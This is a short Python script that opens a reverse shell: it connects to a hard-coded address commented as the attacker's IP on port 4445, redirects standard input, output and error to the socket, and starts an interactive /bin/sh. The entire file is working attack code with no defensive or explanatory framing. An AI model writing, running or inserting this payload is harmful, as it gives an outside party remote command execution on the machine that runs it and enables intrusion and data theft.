import socket
import subprocess
import os

def reverse_shell():
    HOST = '192.168.106.226'  # Attacker's IP
    PORT = 4445         # Attacker's port
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Redirect standard file descriptors to socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    
    # Start interactive shell
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()
